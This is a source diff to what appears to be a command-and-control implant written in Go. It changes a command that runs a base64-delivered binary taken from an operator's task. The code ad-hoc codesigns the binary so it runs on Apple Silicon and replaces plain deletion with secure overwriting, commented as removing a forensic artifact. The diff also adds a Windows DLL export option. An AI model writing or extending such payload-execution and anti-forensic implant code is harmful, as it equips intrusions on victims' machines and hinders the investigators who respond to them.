@@ -18,9 +18,10 @@ import (
 
 // executeMemoryArgs is shared with execute_memory_linux.go (duplicated due to build tags).
 type executeMemoryArgs struct {
-	BinaryB64 string `json:"binary_b64"` // base64-encoded binary
-	Arguments string `json:"arguments"`  // command-line arguments (space-separated)
-	Timeout   int    `json:"timeout"`    // execution timeout in seconds (default: 60)
+	BinaryB64  string `json:"binary_b64"`  // base64-encoded binary
+	Arguments  string `json:"arguments"`   // command-line arguments (space-separated)
+	Timeout    int    `json:"timeout"`     // execution timeout in seconds (default: 60)
+	ExportName string `json:"export_name"` // (Windows only) export function to call for DLLs
 }
 
 // ExecuteMemoryCommand executes a Mach-O binary with minimal disk footprint.
@@ -74,22 +75,21 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 	// Write the binary
 	if _, err := tmpFile.Write(binaryData); err != nil {
 		tmpFile.Close()
-		os.Remove(tmpPath)
+		secureRemove(tmpPath)
 		return errorf("Error writing binary: %v", err)
 	}
 	tmpFile.Close()
 
 	// Make executable
 	if err := os.Chmod(tmpPath, 0700); err != nil {
-		os.Remove(tmpPath)
+		secureRemove(tmpPath)
 		return errorf("Error setting executable permission: %v", err)
 	}
 
 	// Ad-hoc codesign — required on Apple Silicon (arm64) for unsigned binaries.
 	// Without signing, macOS kills the process immediately with SIGKILL.
-	signCmd := exec.Command("/usr/bin/codesign", "-s", "-", tmpPath)
-	if signOut, signErr := signCmd.CombinedOutput(); signErr != nil {
-		os.Remove(tmpPath)
+	if signOut, signErr := execCmdTimeout("/usr/bin/codesign", "-s", "-", tmpPath); signErr != nil {
+		secureRemove(tmpPath)
 		return errorf("Error code signing binary: %v: %s", signErr, string(signOut))
 	}
 
@@ -113,7 +113,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 	// because macOS validates code signatures at runtime — unlinking the file
 	// while the process runs causes SIGKILL on Apple Silicon.
 	execErr := cmd.Run()
-	os.Remove(tmpPath) // Clean up after execution completes
+	secureRemove(tmpPath) // Overwrite before removal — temp binary is a forensic artifact
 
 	// Build output from stdout + stderr
 	var sb strings.Builder
@@ -136,11 +136,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 		if output == "" {
 			output = fmt.Sprintf("Error executing binary: %v", execErr)
 		}
-		return structs.CommandResult{
-			Output:    output,
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output)
 	}
 
 	output := sb.String()
@@ -148,11 +144,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 		output = fmt.Sprintf("[+] Binary executed successfully (%d bytes, no output)", len(binaryData))
 	}
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // isValidMachO checks for valid Mach-O magic bytes.
